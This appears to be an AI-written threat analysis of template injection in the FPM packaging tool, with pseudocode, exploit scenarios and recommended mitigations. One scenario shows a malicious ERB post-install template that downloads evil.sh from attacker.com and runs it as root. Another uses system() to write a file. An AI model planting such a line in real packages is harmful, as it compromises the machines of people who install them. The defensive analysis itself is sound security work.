Okay, let's break down this "Template Injection (Custom Script Manipulation)" threat in FPM with a deep analysis.

## Deep Analysis: Template Injection in FPM

### 1. Objective, Scope, and Methodology

**Objective:**

The primary objective of this deep analysis is to:

*   Fully understand the mechanics of the Template Injection vulnerability within the context of FPM.
*   Identify the specific code paths and conditions that make this vulnerability exploitable.
*   Assess the practical exploitability and potential impact on both the build and target systems.
*   Evaluate the effectiveness of the proposed mitigation strategies and suggest improvements or alternatives.
*   Provide actionable recommendations for developers and users of FPM to minimize the risk.

**Scope:**

This analysis focuses specifically on the Template Injection vulnerability described in the threat model.  It encompasses:

*   The `-t` option in FPM and its interaction with custom templates.
*   The templating engine(s) supported by FPM (primarily ERB, but we'll consider others if relevant).
*   The `FPM::Package#template` method and related code responsible for template processing.
*   The package creation and installation processes, focusing on how templates are used in each.
*   The security implications of template injection during both build and installation.
*   The interaction of Fpm with underlying operating system.

This analysis *does not* cover:

*   Other potential vulnerabilities in FPM (unless they directly relate to template injection).
*   Vulnerabilities in the underlying operating system or packaging formats (e.g., vulnerabilities in `rpm` or `dpkg` themselves).  We assume these are handled separately.

**Methodology:**

1.  **Code Review:**  We will examine the relevant parts of the FPM source code (available on GitHub) to understand how templates are loaded, processed, and used.  This includes:
    *   The command-line parsing logic for the `-t` option.
    *   The `FPM::Package#template` method and any helper methods it calls.
    *   The integration with the chosen templating engine (e.g., ERB).
    *   The code that handles package installation and the execution of pre/post-install scripts.

2.  **Vulnerability Analysis:** Based on the code review, we will identify the specific points where template injection could occur.  We will analyze:
    *   How user-provided template files are read and parsed.
    *   How variables are passed to the templating engine.
    *   Whether any sanitization or validation is performed on the template content or input variables.
    *   How the output of the templating engine is used (e.g., written to files, executed as commands).

3.  **Exploit Scenario Development:** We will construct realistic exploit scenarios to demonstrate the vulnerability.  This will involve:
    *   Creating malicious template files that contain injected code.
    *   Determining how to trigger the execution of these templates during package creation or installation.
    *   Analyzing the impact of the injected code (e.g., creating files, executing commands, escalating privileges).

4.  **Mitigation Evaluation:** We will assess the effectiveness of the proposed mitigation strategies:
    *   **Secure Template Storage:**  How practical is this in different deployment scenarios?  What are the limitations?
    *   **Template Integrity Verification:**  What hashing algorithms are suitable?  How can this be integrated into the FPM workflow?
    *   **Template Review:**  What specific patterns should reviewers look for?  How can this be automated?
    *   **Input Validation (within templates):**  What are the best practices for input validation within ERB (or other templating languages)?
    *   **Sandboxed Templating:**  Which sandboxed templating engines are compatible with FPM?  What are their security guarantees?

5.  **Recommendations:** Based on the analysis, we will provide concrete recommendations for:
    *   FPM developers:  Code changes to mitigate the vulnerability.
    *   FPM users:  Best practices for using FPM securely.

### 2. Deep Analysis of the Threat

**2.1 Code Review and Vulnerability Analysis**

Let's examine the likely code paths (based on the threat description and common FPM usage).  We'll use pseudocode and simplified examples, as the exact FPM code might be more complex.

*   **Command-Line Parsing:**

    ```
    # Simplified example
    options = parse_command_line_arguments()
    if options.has_key?("-t"):
        template_path = options["-t"]
        package = FPM::Package.new(...)
        package.template(template_path)
    ```

    The `-t` option directly specifies the path to a template file.  This is the *primary entry point* for the vulnerability.  If an attacker can control this path, they can specify *any* file.

*   **`FPM::Package#template` (Simplified):**

    ```ruby
    class FPM::Package
      def template(template_path)
        template_content = File.read(template_path) # Vulnerability: Reads arbitrary file
        engine = ERB.new(template_content)        # Vulnerability: Passes to ERB
        result = engine.result(binding)           # Vulnerability: Executes arbitrary code
        # ... use the 'result' ...
      end
    end
    ```

    This is where the core vulnerability lies.  The code:

    1.  **Reads an arbitrary file:** `File.read(template_path)` reads the content of the file specified by the attacker.  There's no validation of the file's content or location (beyond basic file system permissions).
    2.  **Passes the content to ERB:** `ERB.new(template_content)` creates a new ERB template object from the attacker-controlled content.  ERB is *powerful* and allows arbitrary Ruby code execution.
    3.  **Executes the template:** `engine.result(binding)` executes the ERB template.  The `binding` provides the context (variables) for the template.  Any Ruby code within the template will be executed with the privileges of the user running FPM.

*   **Template Usage (Example: pre/post-install scripts):**

    A common use of templates is to generate pre-install or post-install scripts for packages.  For example, a template might look like this:

    ```erb
    #!/bin/sh
    # This is a pre-install script
    <%= @some_variable %>
    ```

    If `@some_variable` is not properly sanitized, or if the entire template is attacker-controlled, the attacker can inject arbitrary shell commands.  These commands will be executed by the package manager (e.g., `rpm`, `dpkg`) *with root privileges* during installation.

**2.2 Exploit Scenarios**

*   **Scenario 1: Build-Time Code Execution (Less Severe):**

    1.  Attacker gains write access to the directory where FPM is run, or can influence the `-t` option through some other means (e.g., a compromised build server).
    2.  Attacker creates a malicious template file: `evil.erb`:

        ```erb
        <% system("echo 'Hacked!' > /tmp/hacked.txt") %>
        ```

    3.  Attacker runs FPM with `-t evil.erb`.
    4.  During package creation, FPM reads `evil.erb`, executes the embedded Ruby code, and creates `/tmp/hacked.txt`.  This demonstrates code execution, but it's limited to the build environment.

*   **Scenario 2: Installation-Time Code Execution (High Severity):**

    1.  Attacker compromises a system where FPM templates are stored (or can otherwise influence the template used).
    2.  Attacker modifies a template used for generating a post-install script:

        ```erb
        #!/bin/sh
        # Original post-install script...
        <%= system("wget http://attacker.com/evil.sh -O /tmp/evil.sh && chmod +x /tmp/evil.sh && /tmp/evil.sh") %>
        # More original script...
        ```

    3.  FPM is used to create a package using this compromised template.
    4.  An unsuspecting user installs the package.
    5.  During installation, the package manager executes the post-install script.
    6.  The injected code downloads a malicious script (`evil.sh`) from the attacker's server, makes it executable, and runs it.  This script can do *anything* with root privileges.  This is a full system compromise.

**2.3 Mitigation Evaluation**

*   **Secure Template Storage:**
    *   **Effectiveness:**  Highly effective *if implemented correctly*.  The key is to ensure that *only* trusted users/processes can modify the templates.
    *   **Limitations:**  Requires careful configuration of file system permissions and access control.  May be difficult to manage in complex environments.  Doesn't protect against insider threats (trusted users going rogue).
    *   **Recommendation:** Use strict file system permissions (e.g., `chmod 600` or `640`, owned by a dedicated user/group).  Consider using a version control system (e.g., Git) to track changes and restrict access.

*   **Template Integrity Verification:**
    *   **Effectiveness:**  Very effective at detecting *unauthorized* modifications.
    *   **Limitations:**  Requires a mechanism to store and manage checksums.  Doesn't prevent a trusted user from creating a malicious template *initially*.
    *   **Recommendation:**  Use a strong cryptographic hash function (e.g., SHA-256).  Store checksums in a separate, secure location (e.g., a signed file, a database).  Integrate checksum verification into the FPM build process *before* the template is used.

*   **Template Review:**
    *   **Effectiveness:**  Can be effective, but relies on human expertise and diligence.
    *   **Limitations:**  Prone to human error.  Difficult to scale.  May not catch subtle vulnerabilities.
    *   **Recommendation:**  Establish clear guidelines for template review.  Look for:
        *   Any use of `system`, `exec`, `eval`, or other potentially dangerous functions.
        *   Any way user input can influence the template output without proper sanitization.
        *   Any external dependencies (e.g., downloading files from the internet).
        *   Use automated tools (e.g., linters, static analysis) to assist with the review process.

*   **Input Validation (within templates):**
    *   **Effectiveness:**  Essential if templates accept any input.
    *   **Limitations:**  Requires careful understanding of the templating language's features and potential vulnerabilities.
    *   **Recommendation:**  Use ERB's built-in escaping mechanisms (e.g., `<%=h @variable %>` for HTML escaping).  Consider using a dedicated sanitization library.  Validate input types and lengths.  Avoid using user input directly in shell commands.

*   **Sandboxed Templating:**
    *   **Effectiveness:**  The *best* defense, as it limits the capabilities of the templating engine itself.
    *   **Limitations:**  May require switching to a different templating engine.  Sandboxing may not be perfect (vulnerabilities can exist in the sandbox itself).
    *   **Recommendation:**  Investigate sandboxed templating engines like Liquid (https://shopify.github.io/liquid/).  Liquid is designed for security and prevents arbitrary code execution.  If using ERB, explore options for running it in a restricted environment (e.g., using `Safe` levels, though these are not foolproof).

### 3. Recommendations

**For FPM Developers:**

1.  **Prioritize Sandboxing:**  Strongly consider integrating a sandboxed templating engine like Liquid as the default or as a highly recommended option.  This provides the strongest protection against template injection.
2.  **Implement Integrity Checks:**  Add built-in support for verifying template integrity using checksums (e.g., SHA-256).  Make this a default behavior or a prominent option.
3.  **Warn Users:**  Clearly warn users about the risks of using untrusted templates with the `-t` option.  Emphasize the importance of secure template storage and review.
4.  **Review and Harden Existing Code:**  Thoroughly review the existing template handling code (especially `FPM::Package#template`) and look for any potential vulnerabilities.  Consider adding more robust input validation and sanitization.
5.  **Deprecate Unsafe Features (if possible):** If feasible, consider deprecating or removing features that make template injection easier, such as the ability to pass arbitrary Ruby code to ERB.

**For FPM Users:**

1.  **Treat Templates as Code:**  Recognize that templates are essentially code and should be treated with the same level of security as any other executable code.
2.  **Secure Template Storage:**  Store templates in a secure location with restricted write access.  Use version control to track changes.
3.  **Verify Template Integrity:**  If possible, manually calculate and verify checksums of your templates before using them.
4.  **Review Templates Carefully:**  Thoroughly review any templates you use, especially if they come from untrusted sources.
5.  **Prefer Sandboxed Templating:**  If possible, use a sandboxed templating engine like Liquid.
6.  **Avoid Untrusted Input:** Minimize or avoid passing untrusted input to templates. If you must, sanitize and validate it rigorously *within the template*.
7.  **Run FPM with Least Privilege:** Avoid running FPM as root unless absolutely necessary.  Use a dedicated user account with limited privileges.
8. **Use FPM version with fixes, after they will be implemented.**

By following these recommendations, both developers and users can significantly reduce the risk of template injection vulnerabilities in FPM and ensure the secure creation and deployment of software packages.